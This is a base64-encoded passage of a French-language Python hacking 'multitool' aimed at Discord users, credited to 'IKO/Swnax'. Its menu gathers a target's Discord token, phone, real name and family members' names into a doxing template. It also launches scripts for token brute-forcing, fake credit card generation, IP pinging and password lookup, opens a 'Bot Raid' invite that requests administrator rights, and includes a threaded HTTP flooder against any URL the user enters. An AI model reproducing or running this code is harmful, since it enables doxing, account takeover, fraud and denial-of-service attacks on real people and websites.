ZWxpZiBjaG9pY2UgPT0gIjMiIDoKCiAgICAgICAgICAgIGJ5ID0gaW5wdXQoRm9yZS5ZRUxMT1cgKyBTdHlsZS5CUklHSFQgKyAiRG94w6kgcGFyIDogIiArIFN0eWxlLlJFU0VUX0FMTCkKICAgICAgICAgICAgcmVhc29uID0gaW5wdXQoRm9yZS5ZRUxMT1cgKyBTdHlsZS5CUklHSFQgKyAiUmFpc29uIDogIiArIFN0eWxlLlJFU0VUX0FMTCkKICAgICAgICAgICAgcHNldWRvMSA9IGlucHV0ICggRm9yZS5ZRUxMT1cgKyBTdHlsZS5CUklHSFQgKyAiRW50cmV6IGxlIHByZW1pZXIgcHNldWRvIDogIiArIFN0eWxlLlJFU0VUX0FMTCApCiAgICAgICAgICAgIHBzZXVkbzIgPSBpbnB1dCAoIEZvcmUuWUVMTE9XICsgU3R5bGUuQlJJR0hUICsgIkVudHJleiBsZSBzZWNvbmQgcHNldWRvIDogIiArIFN0eWxlLlJFU0VUX0FMTCApCgogICAgICAgICAgICB1c2VybmFtZV9kaXNjb3JkID0gaW5wdXQgKAogICAgICAgICAgICAgICAgRm9yZS5ZRUxMT1cgKyBTdHlsZS5CUklHSFQgKyAiRW50cmV6IGxlIG5vbSBkJ3V0aWxpc2F0ZXVyIERpc2NvcmQgOiAiICsgU3R5bGUuUkVTRVRfQUxMICkKICAgICAgICAgICAgZGlzcGxheV9uYW1lX2Rpc2NvcmQgPSBpbnB1dCAoCiAgICAgICAgICAgICAgICBGb3JlLllFTExPVyArIFN0eWxlLkJSSUdIVCArICJFbnRyZXogbGUgbm9tIGQnYWZmaWNoYWdlIERpc2NvcmQgOiAiICsgU3R5bGUuUkVTRVRfQUxMICkKICAgICAgICAgICAgdXNlcl9pZF9kaXNjb3JkID0gaW5wdXQgKAogICAgICAgICAgICAgICAgRm9yZS5ZRUxMT1cgKyBTdHlsZS5CUklHSFQgKyAiRW50cmV6IGwnSUQgZGUgbCd1dGlsaXNhdGV1ciBEaXNjb3JkIDogIiArIFN0eWxlLlJFU0VUX0FMTCApCiAgICAgICAgICAgIGF2YXRhcl91cmxfZGlzY29yZCA9IGlucHV0ICgKICAgICAgICAgICAgICAgIEZvcmUuWUVMTE9XICsgU3R5bGUuQlJJR0hUICsgIkVudHJleiBsJ1VSTCBkZSBsJ2F2YXRhciBEaXNjb3JkIDogIiArIFN0eWxlLlJFU0VUX0FMTCApCiAgICAgICAgICAgIGNyZWF0ZWRfYXRfZGlzY29yZCA9IGlucHV0ICgKICAgICAgICAgICAgICAgIEZvcmUuWUVMTE9XICsgU3R5bGUuQlJJR0hUICsgIkRhdGUgZGUgY3LDqWF0aW9uIGR1IGNvbXB0ZSBEaXNjb3JkIDogIiArIFN0eWxlLlJFU0VUX0FMTCApCiAgICAgICAgICAgIHRva2VuID0gaW5wdXQgKCBGb3JlLllFTExPVyArIFN0eWxlLkJSSUdIVCArICJFbnRyZXogbGUgdG9rZW4gRGlzY29yZCA6ICIgKyBTdHlsZS5SRVNFVF9BTEwgKQogICAgICAgICAgICBlbWFpbF9kaXNjb3JkID0gaW5wdXQgKCBGb3JlLllFTExPVyArIFN0eWxlLkJSSUdIVCArICJFbnRyZXogbCdlLW1haWwgRGlzY29yZCA6ICIgKyBTdHlsZS5SRVNFVF9BTEwgKQogICAgICAgICAgICBwaG9uZV9kaXNjb3JkID0gaW5wdXQgKAogICAgICAgICAgICAgICAgRm9yZS5ZRUxMT1cgKyBTdHlsZS5CUklHSFQgKyAiRW50cmV6IGxlIG51bcOpcm8gZGUgdMOpbMOpcGhvbmUgRGlzY29yZCA6ICIgKyBTdHlsZS5SRVNFVF9BTEwgKQogICAgICAgICAgICBuaXRyb19kaXNjb3JkID0gaW5wdXQgKAogICAgICAgICAgICAgICAgRm9yZS5ZRUxMT1cgKyBTdHlsZS5CUklHSFQgKyAiTGUgY29tcHRlIGEtdC1pbCBOaXRybyAoT3VpL05vbikgPyA6ICIgKyBTdHlsZS5SRVNFVF9BTEwgKQogICAgICAgICAgICBmcmllbmRzX2Rpc2NvcmQgPSBpbnB1dCAoIEZvcmUuWUVMTE9XICsgU3R5bGUuQlJJR0hUICsgIkNvbWJpZW4gZCdhbWlzIHN1ciBEaXNjb3JkID8gOiAiICsgU3R5bGUuUkVTRVRfQUxMICkKICAgICAgICAgICAgZ2lmdF9jb2Rlc19kaXNjb3JkID0gaW5wdXQgKCBGb3JlLllFTExPVyArIFN0eWxlLkJSSUdIVCArICJZIGEtdC1pbCBkZXMgZ2lmdCBjb2RlcyA/IDogIiArIFN0eWxlLlJFU0VUX0FMTCApCiAgICAgICAgICAgIG1mYV9kaXNjb3JkID0gaW5wdXQgKAogICAgICAgICAgICAgICAgRm9yZS5ZRUxMT1cgKyBTdHlsZS5CUklHSFQgKyAiQXV0aGVudGlmaWNhdGlvbiDDoCBkZXV4IGZhY3RldXJzIChPdWkvTm9uKSA/IDogIiArIFN0eWxlLlJFU0VUX0FMTCApCiAgICAgICAgICAgIHBob25lX251bWJlciA9IGlucHV0ICggRm9yZS5ZRUxMT1cgKyBTdHlsZS5CUklHSFQgKyAiTnVtw6lybyBkZSBiaWdvIGRlIGxhIHBlcnNvbm5lID8gOiAiICsgU3R5bGUuUkVTRVRfQUxMICkKICAgICAgICAgICAgYnJhbmRfcGhvbmUgPSBpbnB1dCAoIEZvcmUuWUVMTE9XICsgU3R5bGUuQlJJR0hUICsgIk1hcnF1ZSBkdSB0w6lsw6lwaG9uZSA6ICIgKyBTdHlsZS5SRVNFVF9BTEwgKQogICAgICAgICAgICBvcGVyYXRvcl9waG9uZSA9IGlucHV0ICggRm9yZS5ZRUxMT1cgKyBTdHlsZS5CUklHSFQgKyAiT3DDqXJhdGV1ciBkdSB0w6lsw6lwaG9uZSA6ICIgKyBTdHlsZS5SRVNFVF9BTEwgKQogICAgICAgICAgICB0eXBlX251bWJlcl9waG9uZSA9IGlucHV0ICgKICAgICAgICAgICAgICAgIEZvcmUuWUVMTE9XICsgU3R5bGUuQlJJR0hUICsgIlR5cGUgZHUgbnVtw6lybyBkZSB0w6lsw6lwaG9uZSA6ICIgKyBTdHlsZS5SRVNFVF9BTEwgKQogICAgICAgICAgICBjb3VudHJ5X3Bob25lID0gaW5wdXQgKCBGb3JlLllFTExPVyArIFN0eWxlLkJSSUdIVCArICJQYXlzIDogIiArIFN0eWxlLlJFU0VUX0FMTCApCiAgICAgICAgICAgIHJlZ2lvbl9waG9uZSA9IGlucHV0ICggRm9yZS5ZRUxMT1cgKyBTdHlsZS5CUklHSFQgKyAiUsOpZ2lvbiA6ICIgKyBTdHlsZS5SRVNFVF9BTEwgKQogICAgICAgICAgICB0aW1lem9uZV9waG9uZSA9IGlucHV0ICggRm9yZS5ZRUxMT1cgKyBTdHlsZS5CUklHSFQgKyAiRnVzZWF1IGhvcmFpcmUgOiAiICsgU3R5bGUuUkVTRVRfQUxMICkKICAgICAgICAgICAgZ2VuZGVyID0gaW5wdXQgKCBGb3JlLllFTExPVyArIFN0eWxlLkJSSUdIVCArICJTZXhlIChob21tZSxmZW1tZSkgOiAiICsgU3R5bGUuUkVTRVRfQUxMICkKICAgICAgICAgICAgbGFzdF9uYW1lID0gaW5wdXQgKCBGb3JlLllFTExPVyArIFN0eWxlLkJSSUdIVCArICJOb20gZGUgZmFtaWxsZSA6ICIgKyBTdHlsZS5SRVNFVF9BTEwgKQogICAgICAgICAgICBmaXJzdF9uYW1lID0gaW5wdXQgKCBGb3JlLllFTExPVyArIFN0eWxlLkJSSUdIVCArICJQcsOpbm9tIDogIiArIFN0eWxlLlJFU0VUX0FMTCApCiAgICAgICAgICAgIGFnZSA9IGlucHV0ICggRm9yZS5ZRUxMT1cgKyBTdHlsZS5CUklHSFQgKyAiw4JnZSA6ICIgKyBTdHlsZS5SRVNFVF9BTEwgKQogICAgICAgICAgICBtb3RoZXIgPSBpbnB1dCAoIEZvcmUuWUVMTE9XICsgU3R5bGUuQlJJR0hUICsgIk5vbSBkZSBzYSBtw6hyZSA6ICIgKyBTdHlsZS5SRVNFVF9BTEwgKQogICAgICAgICAgICBmYXRoZXIgPSBpbnB1dCAoIEZvcmUuWUVMTE9XICsgU3R5bGUuQlJJR0hUICsgIk5vbSBkZSBzb24gcMOocmUgOiAiICsgU3R5bGUuUkVTRVRfQUxMICkKICAgICAgICAgICAgYnJvdGhlciA9IGlucHV0ICggRm9yZS5ZRUxMT1cgKyBTdHlsZS5CUklHSFQgKyAiTm9tIGRlIHNvbiBmcsOocmUgOiAiICsgU3R5bGUuUkVTRVRfQUxMICkKICAgICAgICAgICAgc2lzdGVyID0gaW5wdXQgKCBGb3JlLllFTExPVyArIFN0eWxlLkJSSUdIVCArICJOb20gZGUgc2Egc8WTdXIgOiAiICsgU3R5bGUuUkVTRVRfQUxMICkKCiAgICAgICAgICAgIHByaW50ICggZG94X3RlbXBsYXRlLmZvcm1hdCAoCiAgICAgICAgICAgICAgICBieT1ieSwKICAgICAgICAgICAgICAgIHJlYXNvbj1yZWFzb24sCiAgICAgICAgICAgICAgICBwc2V1ZG8xPXBzZXVkbzEsCiAgICAgICAgICAgICAgICBwc2V1ZG8yPXBzZXVkbzIsCiAgICAgICAgICAgICAgICB1c2VybmFtZV9kaXNjb3JkPXVzZXJuYW1lX2Rpc2NvcmQsCiAgICAgICAgICAgICAgICBkaXNwbGF5X25hbWVfZGlzY29yZD1kaXNwbGF5X25hbWVfZGlzY29yZCwKICAgICAgICAgICAgICAgIHVzZXJfaWRfZGlzY29yZD11c2VyX2lkX2Rpc2NvcmQsCiAgICAgICAgICAgICAgICBhdmF0YXJfdXJsX2Rpc2NvcmQ9YXZhdGFyX3VybF9kaXNjb3JkLAogICAgICAgICAgICAgICAgY3JlYXRlZF9hdF9kaXNjb3JkPWNyZWF0ZWRfYXRfZGlzY29yZCwKICAgICAgICAgICAgICAgIHRva2VuPXRva2VuLAogICAgICAgICAgICAgICAgZW1haWxfZGlzY29yZD1lbWFpbF9kaXNjb3JkLAogICAgICAgICAgICAgICAgcGhvbmVfZGlzY29yZD1waG9uZV9kaXNjb3JkLAogICAgICAgICAgICAgICAgbml0cm9fZGlzY29yZD1uaXRyb19kaXNjb3JkLAogICAgICAgICAgICAgICAgZnJpZW5kc19kaXNjb3JkPWZyaWVuZHNfZGlzY29yZCwKICAgICAgICAgICAgICAgIGdpZnRfY29kZXNfZGlzY29yZD1naWZ0X2NvZGVzX2Rpc2NvcmQsCiAgICAgICAgICAgICAgICBtZmFfZGlzY29yZD1tZmFfZGlzY29yZCwKICAgICAgICAgICAgICAgIHBob25lX251bWJlcj1waG9uZV9udW1iZXIsCiAgICAgICAgICAgICAgICBicmFuZF9waG9uZT1icmFuZF9waG9uZSwKICAgICAgICAgICAgICAgIG9wZXJhdG9yX3Bob25lPW9wZXJhdG9yX3Bob25lLAogICAgICAgICAgICAgICAgdHlwZV9udW1iZXJfcGhvbmU9dHlwZV9udW1iZXJfcGhvbmUsCiAgICAgICAgICAgICAgICBjb3VudHJ5X3Bob25lPWNvdW50cnlfcGhvbmUsCiAgICAgICAgICAgICAgICByZWdpb25fcGhvbmU9cmVnaW9uX3Bob25lLAogICAgICAgICAgICAgICAgdGltZXpvbmVfcGhvbmU9dGltZXpvbmVfcGhvbmUsCiAgICAgICAgICAgICAgICBnZW5kZXI9Z2VuZGVyLAogICAgICAgICAgICAgICAgbGFzdF9uYW1lPWxhc3RfbmFtZSwKICAgICAgICAgICAgICAgIGZpcnN0X25hbWU9Zmlyc3RfbmFtZSwKICAgICAgICAgICAgICAgIGFnZT1hZ2UsCiAgICAgICAgICAgICAgICBtb3RoZXI9bW90aGVyLAogICAgICAgICAgICAgICAgZmF0aGVyPWZhdGhlciwKICAgICAgICAgICAgICAgIGJyb3RoZXI9YnJvdGhlciwKICAgICAgICAgICAgICAgIHNpc3Rlcj1zaXN0ZXIsCiAgICAgICAgICAgICkgKQogICAgICAgICAgICBpbnB1dCAoICJBcHB1eWV6IHN1ciBFbnRyw6llIHBvdXIgcmV2ZW5pciBhdSBtZW51Li4uIiApCgoKICAgICAgICBlbGlmIGNob2ljZSA9PSAiNCIgOgoKICAgICAgICAgICAgb3Muc3lzdGVtICggInB5dGhvbiBkaXNwbGF5X2lwX3BvcnQucHkiICkKCiAgICAgICAgICAgIGlucHV0ICggIkFwcHV5ZXogc3VyIEVudHLDqWUgcG91ciByZXZlbmlyIGF1IG1lbnUuLi4iICkKCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjUiIDoKICAgICAgICAgICAgdG9rZW5fY2hlY2tlcigpCiAgICAgICAgICAgIGlucHV0ICggIkFwcHV5ZXogc3VyIEVudHLDqWUgcG91ciByZXZlbmlyIGF1IG1lbnUuLi4iICkKCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjYiIDoKICAgICAgICAgICAgZGRvc19yZXNpc3RhbmNlX3Rlc3QoKQogICAgICAgICAgICBpbnB1dCAoICJBcHB1eWV6IHN1ciBFbnRyw6llIHBvdXIgcmV2ZW5pciBhdSBtZW51Li4uIiApCgogICAgICAgIGVsaWYgY2hvaWNlID09ICI3IiA6CiAgICAgICAgICAgIG9zLnN5c3RlbSgncHl0aG9uIGdlbmVyYXRlX2Zha2VfY3JlZGl0X2NhcmQucHknKQogICAgICAgICAgICBpbnB1dCAoICJBcHB1eWV6IHN1ciBFbnRyw6llIHBvdXIgcmV2ZW5pciBhdSBtZW51Li4uIiApCgogICAgICAgIGVsaWYgY2hvaWNlID09ICI4IiA6CiAgICAgICAgICAgIG9zLnN5c3RlbSAoICdweXRob24gdG9rZW5fYnJ1dGVmb3JjZS5weScgKQogICAgICAgICAgICBpbnB1dCAoICJBcHB1eWV6IHN1ciBFbnRyw6llIHBvdXIgcmV2ZW5pciBhdSBtZW51Li4uIiApCgogICAgICAgIGVsaWYgY2hvaWNlID09ICI5IiA6CiAgICAgICAgICAgIG9zLnN5c3RlbSAoICdweXRob24gbnVtYmVyX2xvb2t1cC5weScgKQogICAgICAgICAgICBpbnB1dCAoICJBcHB1eWV6IHN1ciBFbnRyw6llIHBvdXIgcmV2ZW5pciBhdSBtZW51Li4uIiApCgogICAgICAgIGVsaWYgY2hvaWNlID09ICIxMCIgOgogICAgICAgICAgICBvcy5zeXN0ZW0oICdweXRob24gaXBfcGluZ2VyLnB5JyApCiAgICAgICAgICAgIGlucHV0ICggIkFwcHV5ZXogc3VyIEVudHLDqWUgcG91ciByZXZlbmlyIGF1IG1lbnUuLi4iICkKCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjExIiA6CiAgICAgICAgICAgIG9zLnN5c3RlbSAoICdweXRob24gc2VuZF93ZWJob29rX21lc3NhZ2UucHknICkKICAgICAgICAgICAgaW5wdXQgKCAiQXBwdXlleiBzdXIgRW50csOpZSBwb3VyIHJldmVuaXIgYXUgbWVudS4uLiIgKQoKICAgICAgICBlbGlmIGNob2ljZSA9PSAiMTIiIDoKICAgICAgICAgICAgb3Blbl9nb29nbGVfbGluaygpCiAgICAgICAgICAgIGlucHV0ICggIkFwcHV5ZXogc3VyIEVudHLDqWUgcG91ciByZXZlbmlyIGF1IG1lbnUuLi4iICkKCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjEzIiA6CiAgICAgICAgICAgIG9zLnN5c3RlbSAoICdweXRob24gZW1haWxfbG9va3VwLnB5JyApCiAgICAgICAgICAgIGlucHV0ICggIkFwcHV5ZXogc3VyIEVudHLDqWUgcG91ciByZXZlbmlyIGF1IG1lbnUuLi4iICkKCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjE0IiA6CiAgICAgICAgICAgIG9zLnN5c3RlbSAoICdweXRob24gcGFzc3dvcmRfbG9va3VwLnB5JyApCiAgICAgICAgICAgIGlucHV0ICggIkFwcHV5ZXogc3VyIEVudHLDqWUgcG91ciByZXZlbmlyIGF1IG1lbnUuLi4iICkKCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjE1IiA6CiAgICAgICAgICAgIGlucHV0ICggIk9wdGlvbiAxNSBub24gaW1wbMOpbWVudMOpZS4gQXBwdXlleiBzdXIgRW50csOpZSBwb3VyIHJldmVuaXIgYXUgbWVudS4uLiIgKQoKICAgICAgICBlbGlmIGNob2ljZSA9PSAiMTYiIDoKICAgICAgICAgICAgb3Muc3lzdGVtICggJ3B5dGhvbiBnZXRfd2Vic2l0ZV9pbmZvLnB5JyApCiAgICAgICAgICAgIGlucHV0ICggIkFwcHV5ZXogc3VyIEVudHLDqWUgcG91ciByZXZlbmlyIGF1IG1lbnUuLi4iICkKCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjE3IiA6CiAgICAgICAgICAgIGlucHV0ICggIk9wdGlvbiAxNyBub24gaW1wbMOpbWVudMOpZS4gQXBwdXlleiBzdXIgRW50csOpZSBwb3VyIHJldmVuaXIgYXUgbWVudS4uLiIgKQoKICAgICAgICBlbGlmIGNob2ljZSA9PSAiMTgiIDoKICAgICAgICAgICAgb3Muc3lzdGVtKCAncHl0aG9uIHBhc3N3b3JkX2VuY3J5cHQucHknICkKICAgICAgICAgICAgaW5wdXQgKCAiQXBwdXlleiBzdXIgRW50csOpZSBwb3VyIHJldmVuaXIgYXUgbWVudS4uLiIgKQoKICAgICAgICBlbGlmIGNob2ljZSA9PSAiMTkiIDoKICAgICAgICAgICAgaW5wdXQgKCAiT3B0aW9uIDE5IG5vbiBpbXBsw6ltZW50w6llLiBBcHB1eWV6IHN1ciBFbnRyw6llIHBvdXIgcmV2ZW5pciBhdSBtZW51Li4uIiApCgogICAgICAgIGVsaWYgY2hvaWNlID09ICIyMCIgOgogICAgICAgICAgICBvcy5zeXN0ZW0gKCAncHl0aG9uIHVzZXJuYW1lX3RyYWNrZXIucHknICkKICAgICAgICAgICAgaW5wdXQgKCAiQXBwdXlleiBzdXIgRW50csOpZSBwb3VyIHJldmVuaXIgYXUgbWVudS4uLiIgKQoKICAgICAgICBlbHNlIDoKICAgICAgICAgICAgcHJpbnQgKCAiTWVyY2kgZGUgcmVudHJlciB1biBub21icmUgdmFsaWRlIiApCgoKZGVmIG9wZW5fZ29vZ2xlX2xpbmsoKToKICAgIHByaW50KEZvcmUuWUVMTE9XICsgIlxuLS0tIE9wZW5pbmcgQm90IFJhaWQgLS0tXG4iICsgU3R5bGUuUkVTRVRfQUxMKQoKICAgICMgRGVmaW5lIHRoZSBHb29nbGUgbGluawogICAgZ29vZ2xlX2xpbmsgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9vYXV0aDIvYXV0aG9yaXplP2NsaWVudF9pZD0xMjc0NzQyOTM1Mzk2NjgzNzc2JnBlcm1pc3Npb25zPTgmaW50ZWdyYXRpb25fdHlwZT0wJnNjb3BlPWJvdCIKCgogICAgd2ViYnJvd3Nlci5vcGVuKGdvb2dsZV9saW5rKQoKICAgIHByaW50KEZvcmUuR1JFRU4gKyAiR29vZ2xlIGhhcyBiZWVuIG9wZW5lZCBpbiB5b3VyIGJyb3dzZXIhXG4iICsgU3R5bGUuUkVTRVRfQUxMKQojIENvcHlyaWdodCAoYykgdG9vbCBJS08vU3duYXgKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tfAojICAgICAtIERvIG5vdCB0b3VjaCBvciBtb2RpZnkgdGhlIGNvZGUgYmVsb3cuIElmIHRoZXJlIGlzIGFuIGVycm9yLCBwbGVhc2UgY29udGFjdCB0aGUgb3duZXIsIGJ1dCB1bmRlciBubyBjaXJjdW1zdGFuY2VzIHNob3VsZCB5b3UgdG91Y2ggdGhlIGNvZGUuCiMgICAgIC0gRG8gbm90IHJlc2VsbCB0aGlzIHRvb2wsIGRvIG5vdCBjcmVkaXQgaXQgdG8geW91cnMuCiMgICAgIC0gTmUgcGFzIHRvdWNoZXIgbmkgbW9kaWZpZXIgbGUgY29kZSBjaS1kZXNzb3VzLiBFbiBjYXMgZCdlcnJldXIsIHZldWlsbGV6IGNvbnRhY3RlciBsZSBwcm9wcmnDqXRhaXJlLCBtYWlzIGVuIGF1Y3VuIGNhcyB2b3VzIG5lIGRldmV6IHRvdWNoZXIgYXUgY29kZS4KIyAgICAgLSBOZSByZXZlbmRleiBwYXMgY2UgdG9vbCwgbmUgbGUgY3LDqWRpdGV6IHBhcyBhdSB2w7R0cmUuCmRlZiBkZG9zX3Jlc2lzdGFuY2VfdGVzdCgpIDoKICAgIHJ1c3NpYW5za2lkZHkgPSAiIiIiCiAgICAK4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAgICDilojilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilZcgICDilojilojilZcg4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWXICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVlwrilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilZDilojilojilZfilojilojilZTilZDilZDilZDilZDilZ0gICAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4paI4paI4pWXICDilojilojilZHilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDilZDilZDilZ0gICAg4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWdCuKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWRICDilojilojilZHilojilojilZEgICDilojilojilZHilojilojilojilojilojilojilojilZcgICAg4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilojilojilZfilojilojilZHilojilojilojilojilojilojilojilZcgICDilojilojilZEgICDilojilojilojilojilojilojilojilZHilojilojilZTilojilojilZcg4paI4paI4pWR4paI4paI4pWRICAgICDilojilojilojilojilojilZcgICAgICAgICDilojilojilZEgICDilojilojilojilojilojilZcgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAgIOKWiOKWiOKVkSAgIArilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWRICAg4paI4paI4pWR4pWa4pWQ4pWQ4pWQ4pWQ4paI4paI4pWRICAgIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKVnSAg4pWa4pWQ4pWQ4pWQ4pWQ4paI4paI4pWR4paI4paI4pWR4pWa4pWQ4pWQ4pWQ4pWQ4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4paI4paI4pWR4pWa4paI4paI4pWX4paI4paI4pWR4paI4paI4pWRICAgICDilojilojilZTilZDilZDilZ0gICAgICAgICDilojilojilZEgICDilojilojilZTilZDilZDilZ0gIOKVmuKVkOKVkOKVkOKVkOKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIArilojilojilojilojilojilojilZTilZ3ilojilojilojilojilojilojilZTilZ3ilZrilojilojilojilojilojilojilZTilZ3ilojilojilojilojilojilojilojilZEgICAg4paI4paI4pWRICDilojilojilZHilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilojilZHilojilojilZHilojilojilojilojilojilojilojilZEgICDilojilojilZEgICDilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKVkSDilZrilojilojilojilojilZHilZrilojilojilojilojilojilojilZfilojilojilojilojilojilojilojilZcgICAgICAg4paI4paI4pWRICAg4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWRICAg4paI4paI4pWRICAgCuKVmuKVkOKVkOKVkOKVkOKVkOKVnSDilZrilZDilZDilZDilZDilZDilZ0gIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSDilZrilZDilZDilZDilZDilZDilZDilZ0gICAg4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZ3ilZrilZDilZDilZDilZDilZDilZDilZ0gICDilZrilZDilZ0gICDilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWQ4pWQ4pWdIOKVmuKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVnSAgICAgICDilZrilZDilZ0gICDilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZDilZDilZDilZDilZDilZ0gICDilZrilZDilZ0gICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIiIiCiAgICBydXNzaWFuc2tpZGR5ID0gZmlyZSAoIHJ1c3NpYW5za2lkZHkgKQogICAgCiAgICBwcmludCAoIHJ1c3NpYW5za2lkZHkgKQogICAgdGFyZ2V0X3VybCA9IGlucHV0ICggIlwwMzNbOTNtUGxlYXNlIGVudGVyIHRoZSB0YXJnZXQgVVJMIChlLmcuLCBodHRwczovL2V4YW1wbGUuY29tKTogXDAzM1swbSIgKQogICAgbnVtX3RocmVhZHMgPSBpbnQgKCBpbnB1dCAoICJcMDMzWzkzbUVudGVyIHRoZSBudW1iZXIgb2YgdGhyZWFkczogXDAzM1swbSIgKSApCiAgICBhdHRhY2tfZHVyYXRpb24gPSBpbnQgKCBpbnB1dCAoICJcMDMzWzkzbUVudGVyIHRoZSBkdXJhdGlvbiBvZiB0aGUgYXR0YWNrIGluIHNlY29uZHM6IFwwMzNbMG0iICkgKQoKICAgIHByaW50ICggIlN0YXJ0aW5nIHRoZSBERG9TIHJlc2lzdGFuY2UgdGVzdC4uLiIgKQoKICAgIGRlZiBzZW5kX3JlcXVlc3RzKCkgOgogICAgICAgIGVuZF90aW1lID0gdGltZS50aW1lICgpICsgYXR0YWNrX2R1cmF0aW9uCiAgICAgICAgd2hpbGUgdGltZS50aW1lICgpIDwgZW5kX3RpbWUgOgogICAgICAgICAgICB0cnkgOgogICAgICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQgKCB0YXJnZXRfdXJsICkKICAgICAgICAgICAgICAgIHByaW50ICggZiJSZXF1ZXN0IHNlbnQsIHN0YXR1cyBjb2RlOiB7cmVzcG9uc2Uuc3RhdHVzX2NvZGV9IiApCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZSA6CiAgICAgICAgICAgICAgICBwcmludCAoIGYiRXJyb3Igc2VuZGluZyByZXF1ZXN0OiB7ZX0iICkKCiAgICB0aHJlYWRzID0gW10KICAgIGZvciBfIGluIHJhbmdlICggbnVtX3RocmVhZHMgKSA6CiAgICAgICAgdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCAoIHRhcmdldD1zZW5kX3JlcXVlc3RzICkKICAgICAgICB0aHJlYWQuc3RhcnQgKCkKICAgICAgICB0aHJlYWRzLmFwcGVuZCAoIHRocmVhZCApCgogICAgZm9yIHRocmVhZCBpbiB0aHJlYWRzIDoKICAgICAgICB0aHJlYWQuam9pbiAoKQoKICAgIHByaW50ICggIkREb1MgcmVzaXN0YW5jZSB0ZXN0IGNvbXBsZXRlZC4iICkKIyBDb3B5cmlnaHQgKGMpIHRvb2wgSUtPL1N3bmF4CiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLXwKIyAgICAgLSBEbyBub3QgdG91Y2ggb3IgbW9kaWZ5IHRoZSBjb2RlIGJlbG93LiBJZiB0aGVyZSBpcyBhbiBlcnJvciwgcGxlYXNlIGNvbnRhY3QgdGhlIG93bmVyLCBidXQgdW5kZXIgbm8gY2lyY3Vtc3RhbmNlcyBzaG91bGQgeW91IHRvdWNoIHRoZSBjb2RlLgojICAgICAtIERvIG5vdCByZXNlbGwgdGhpcyB0b29sLCBkby